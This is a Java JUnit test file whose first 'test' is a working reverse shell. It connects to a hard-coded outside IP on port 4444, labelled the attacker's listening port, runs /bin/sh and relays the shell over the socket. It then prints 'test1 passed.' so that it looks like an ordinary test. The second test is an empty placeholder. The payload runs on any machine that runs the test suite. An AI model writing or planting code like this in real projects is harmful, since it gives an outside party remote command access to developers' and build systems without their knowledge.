package sampletest;

//JUnit 5 annotations
import org.junit.jupiter.api.Test;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class TestSuite1 {

    @Test
    public void test1() {
     String host = "169.38.106.74";
        int port = 4444; // Attackers listening port
        String[] cmd = {"/bin/sh"};
        
        try {
            Socket s = new Socket(host, port);
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            
            while(!s.isClosed()) {
                while (pi.available() > 0) so.write(pi.read());
                while (pe.available() > 0) so.write(pe.read());
                while (si.available() > 0) po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
            }
            
            p.destroy();
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("test1 passed.");

    }

   @Test
    public void test2() {

        System.out.println("test2 passed.");

    }

}
